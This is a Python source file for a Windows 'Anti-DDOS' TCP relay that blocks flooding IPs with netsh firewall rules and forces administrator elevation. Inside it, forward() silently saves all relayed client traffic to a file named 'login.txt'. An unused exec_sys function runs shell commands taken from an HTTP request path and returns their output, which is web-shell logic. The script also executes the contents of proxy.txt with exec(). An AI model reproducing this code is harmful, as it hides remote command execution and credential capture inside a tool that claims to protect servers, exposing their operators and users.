if (__name__ == "__main__"):
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    import ctypes, sys
    if is_admin():
        pass
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    try:
        get_fb=""
        for i in sys.argv:
            if (i=="https://fb.me/khanh10a1"):
                get_fb=str(i)
        if (get_fb==""):
            int("KhanhNguyen9872")
    except:
        get_fb=str(input("Input Facebook Admin: "))
    get_fb="https://fb.me/khanh10a1"
    if (get_fb == "https://fb.me/khanh10a1"):
        def kill_process():
            print(f"\nClosing process....")
            if hasattr(signal, 'SIGKILL'):
                kill(pid, signal.SIGKILL)
            else:
                kill(pid, signal.SIGABRT)
            sys.exit()
        def clear():
            system("cls")
        def forward(ip,port,source,destination,is_a):
            try:
                if (is_a==1):
                    with open("login.txt","wb") as f:
                        string = " "
                        while string:
                            string = source.recv(1024)
                            if string:
                                destination.sendall(string)
                                f.write(string)
                            else:
                                source.shutdown(socket.SHUT_RD)
                                destination.shutdown(socket.SHUT_WR)
                else:
                    string = " "
                    while string:
                        string = source.recv(1024)
                        if string:
                            destination.sendall(string)
                        else:
                            source.shutdown(socket.SHUT_RD)
                            destination.shutdown(socket.SHUT_WR)
            except TimeoutError:
                print(">> Timeout: Port {} from {}".format(str(port),str(ip)))
            except ConnectionAbortedError:
                print(">> Aborted connection: Port {} from {}".format(str(port),str(ip)))
            except ConnectionResetError:
                print(">> Close connection: Port {} from {}".format(str(port),str(ip)))
            except ConnectionRefusedError:
                print(">> Connection refused: Port {} from {}".format(str(port),str(ip)))
            except:
                pass
            try:
                source.shutdown(socket.SHUT_RD)
                destination.shutdown(socket.SHUT_WR)
            except:
                return
        def block_ip(con_ip,port,a):
            global ddos, force_block, list_ban_ip
            a.close()
            if (len(list_ban_ip)<8111):
                list_ban_ip+=str(","+con_ip)
            add_ip_rule(port)
            with open("block_ip.txt","a") as f:
                f.write(",{},\n".format(con_ip))
            force_block[con_ip]=0
        def exec_sys(conn,request,re):
            import subprocess
            payload=unquote(str(request.split()[1].decode('ascii').replace(re.decode('utf-8'),"")).replace("~//","\\")).replace("~/","/")
            if payload == "":
                conn.close()
                return
            try:
                payload=str(subprocess.check_output(payload+" 2>NUL", shell=True, timeout=999999).decode().replace("\r","")).replace("\n","<br></br>")
            except subprocess.CalledProcessError as e:
                payload=str(e)
            except:
                conn.close()
                return
            content_length=len(payload)+3
            conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n")
            if content_length is not None:
                conn.sendall(b"Content-Length: " + str(content_length).encode('ascii') + b"\r\n")
            conn.sendall(b"\r\n")
            conn.sendall(str(payload).encode())
            conn.close()
            return
        def create_rule(port):
            global list_ban_ip
            if (Popen("netsh advfirewall firewall show rule name=\"Khanh {0}\"".format(str(port)), shell=True, stdout=PIPE).stdout.read().decode().split("\r\n")[1][:2]=="No"):
                _=Popen("netsh advfirewall firewall add rule name= \"Khanh {0}\" dir=in action=block profile=any protocol=TCP localport={0} localip=any remoteip=\"{1}\"".format(str(port),str(list_ban_ip)), shell=True, stdout=DEVNULL)
            else:
                _=Popen("netsh advfirewall firewall set rule name=\"Khanh {0}\" new remoteip=\"{1}\"".format(str(port),str(list_ban_ip)), shell=True,stdin=PIPE,stdout=DEVNULL)
                sleep(2)
                list_ban_ip+=","+str(Popen("netsh advfirewall firewall show rule name=\"Khanh {0}\"".format(str(port)), shell=True, stdout=PIPE).stdout.read().decode().split("\r\n")[8].split()[1]).replace("/32","")
                list_ban_ip=str(",".join(list(set(list_ban_ip.split(",")))))
                _=Popen("netsh advfirewall firewall set rule name=\"Khanh {0}\" new remoteip=\"{1}\"".format(str(port),str(list_ban_ip)),shell=True,stdin=PIPE,stdout=DEVNULL)
            _=Popen("netsh advfirewall firewall set rule name=\"Khanh {0}\" new enable=yes".format(str(port)),shell=True,stdin=PIPE,stdout=DEVNULL)
        def add_ip_rule(port):
            global list_ban_ip
            if (len(list_ban_ip)<8111):
                _=Popen("netsh advfirewall firewall set rule name=\"Khanh {0}\" new remoteip=\"{1}\"".format(str(port),str(list_ban_ip)),shell=True,stdin=PIPE,stdout=DEVNULL)
        def open_port(port):
            global ddos, block, force_block, list_ban_ip
            count=0
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                soc.bind((str(host_fake), int(port)))
                soc.listen(9)
                create_rule(port)
                print(">> Started! (KhanhNguyen9872)")
                while 1:
                    try:
                        a,b = soc.accept()
                        con_ip = str(b[0])
                        if (con_ip in block):
                            a.close()
                            if (force_firewall_count>0):
                                try:
                                    force_block[con_ip]+=1
                                except:
                                    force_block[con_ip]=1
                                if (force_block[con_ip]>force_firewall_count):
                                    print("!! Detected {0} try request {1} times! Blocking...".format(str(con_ip),str(force_block[con_ip])))
                                    Thread(target=block_ip, args=(con_ip,port,a)).start()
                                    force_block[con_ip]=0
                                    continue
                                print("Blocked connection from {0} ({1})".format(con_ip,force_block[con_ip]))
                            else:
                                print("Blocked connection from {0}".format(con_ip))
                        else:
                            count+=1
                            try:
                                ddos[con_ip]+=1
                            except KeyError:
                                ddos[con_ip]=1
                            print(f"{count}. Port {port} -> {port_real} | Accept: {con_ip} ({ddos[con_ip]})")
                            try:
                                if (ddos[con_ip]>block_on_count):
                                    print("!! Detected DDOS from {}! Blocking...".format(con_ip))
                                    block.append(con_ip)
                                    Thread(target=block_ip, args=(con_ip,port,a)).start()
                                    continue
                            except:
                                ddos[con_ip]=1
                            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            server_socket.connect((str(host_real), int(port_real)))
                            Thread(target=forward, args=(con_ip,port,a,server_socket,1)).start()
                            Thread(target=forward, args=(con_ip,port,server_socket,a,0)).start()
                        sleep(float(time_connect))
                    except OSError as e:
                        print(f"ERROR: Port {port} | {e}")
                        a.close()
                        continue
                    except:
                        continue
            except PermissionError:
                print(f"ERROR: Port {port} cannot be spoof! Need administrator permission!!")
                return
            except OSError as e:
                print(f"ERROR: Port {port} | {e}")
                return
        def about():
            while 1:
                clear()
                a=str(input("KhanhNguyen9872\n\n1. Facebook\n2. Youtube\n3. Github\n0. Back\n\n Your choose: "))
                if (a=="1"):
                    system("start \"\" \"https://fb.me/khanh10a1\"")
                elif (a=="2"):
                    system("start \"\" \"https://youtube.com/@KhanhNguyen9872_Official_v2\"")
                elif (a=="3"):
                    system("start \"\" \"https://github.com/KhanhNguyen9872\"")
                elif (a=="0"):
                    break
        def remove_block(port):
            while 1:
                clear()
                a=str(input("Are you sure to remove all block IP? [Y/N]: "))
                if (a=="Y") or (a=="y"):
                    _=Popen("netsh advfirewall firewall delete rule name=\"Khanh {}\" dir=in".format(str(port)),shell=True,stdin=PIPE,stdout=DEVNULL)
                    print("Remove All Block IP from [Port {}] completed!\n".format(str(port)))
                    input("Press Enter to Exit!")
                    break
                elif (a=="N") or (a=="n"):
                    break
        def start(port):
            clear()
            global ddos
            print("\nconfig fake: {0}:{1} -> {2}:{3}".format(str(host_fake),str(port_fake),str(host_real),str(port_real)))
            print(f">> Starting Anti-DDOS...")
            Thread(target=open_port, args=(port,)).start()
            sleep(2)
            while 1:
                try:
                    print("No DDOS in {} seconds, reset count...".format(str(reset_on_time)))
                    ddos={}
                    sleep(float(reset_on_time))
                except KeyboardInterrupt:
                    print(">> Press Enter to Exit!")
                    input()
                    kill_process()
        from os import kill, getpid, name, system, remove
        system("wmic process where name=\"Anti-DDOS.exe\" CALL setpriority 256 > NUL 2>&1")
        system("title Anti-DDOS using Python3 (KhanhNguyen9872)")
        clear()
        try:
            from config import *
        except:
            print(">> config.py not found or syntax error!")
            input()
            sys.exit()
        from urllib.parse import unquote
        from subprocess import Popen, PIPE
        from time import sleep
        from threading import Thread
        from random import choice
        import socket, signal
        try:
            from subprocess import DEVNULL
        except ImportError:
            from os import devnull
            DEVNULL = open(devnull, 'wb')
        global pid, ddos, block, force_block, list_ban_ip, blockk
        pid = getpid()
        ddos={}
        block=[]
        blockk=[]
        list_ban_ip=str(ban_ip).replace("/32","")
        force_block={}
        if (name=='nt'):
            try:
                if (int(len([str(x) for x in host_fake.split(".") if x and x!="\n"])+len([str(x) for x in host_real.split(".") if x and x!="\n"])) != 8):
                    _=int("KhanhNguyen9872")
                _=int(port_real)
                _=int(port_fake)
                _=float(time_connect)
                _=int(block_on_count)
                _=int(reset_on_time)
                _=int(is_get_sock)
                _=ban_sock
                _=headers
            except:
                print("\n>> Config file is error!")
                input()
                kill_process()
            with open("block_ip.txt","r") as f:
                block=[str(x) for x in f.read().split(",") if x and x!="\n"]
            for i in block:
                list_ban_ip+=str(",{0}".format(str(i)))
            if (int(is_get_sock)==1):
                try:
                    with open("proxy.txt","r") as f:
                        while 1:
                            khanh=str(input("Found: proxy.txt\nNote: Y for load proxy, N for download new sock proxy\n>> Do you want to load proxy from this file? [Y/N]: "))
                            if (khanh == "Y") or (khanh == "y"):
                                exec("global blockk; {}".format(f.read()))
                                print("\nTotal IP Sock: {} IP".format(str(len(blockk))))
                                print("Real IP Sock: {} IP".format(str(len(list(set(blockk))))))
                                input("Press Enter to Start!")
                                break
                            elif (khanh == "N") or (khanh == "n"):
                                print()
                                _=int("KhanhNguyen9872")
                                break
                except:
                    print("Downloading Sock Proxy....")
                    total_ip=0
                    for sock in ban_sock:
                        count_ip=0
                        print("GET: {}".format(sock),end=" ")
                        sys.stdout.flush()
                        _=",".join(Popen(".\\curl.exe -H \"User-Agent: {1}\" -k -L --max-redirs 20 --silent --connect-timeout 15 \"{0}\"".format(str(sock),str(choice(headers))), stdout=PIPE).stdout.read().decode().replace("\r","").split("\n")).replace("\""," ").split(",")
                        if (len(_)>1):
                            for i in _:
                                try:
                                    temp=str(i.split(":")[0])
                                    int("".join(temp.split(".")))
                                    if i and len(temp.split("."))==4:
                                        blockk.append(temp)
                                        count_ip+=1
                                except:
                                    continue
                            print("(OK - {} IP)".format(str(count_ip)))
                            total_ip+=count_ip
                        else:
                            print("(DIED)")
                    del temp
                    blockk=list(set(blockk))
                    print("\nTotal IP Sock: {} IP".format(str(total_ip)))
                    print("Real IP Sock: {} IP".format(str(len(blockk))))
                    khanh=str(input("\nNOTE: Y for save to file, N for skip save\n>> Do you want to save Real IP? [Y/N]: "))
                    while 1:
                        if (khanh == "Y") or (khanh == "y"):
                            with open("proxy.txt","w") as f:
                                f.write("blockk={}".format(str(blockk)))
                            break
                        elif (khanh == "N") or (khanh == "n"):
                            remove("proxy.txt")
                            break
                print("Processing IP....")
                for _ in blockk:
                    block.append(str(_))
                del blockk
            block=list(set(block))
            try:
                while 1:
                    clear()
                    print("\n1. Anti-DDOS [Fake Port {0}]\n2. Remove All Block IP [Port {0}]\n3. About\n0. Exit\n\n".format(str(port_fake)))
                    khanh=str(input(">> Your choose: "))
                    if (khanh == "1"):
                        start(port_fake)
                    elif (khanh == "2"):
                        remove_block(port_fake)
                    elif (khanh == "3"):
                        about()
                    elif (khanh == "0"):
                        kill_process()
                    continue
            except KeyboardInterrupt:
                print(">> Press Enter to Exit!")
                input()
                kill_process()
        else:
            print("\n>> This tool work only on Windows!\n")
            kill_process()
    else:
        print(">> Facebook Admin is error!")
        input()
        sys.exit()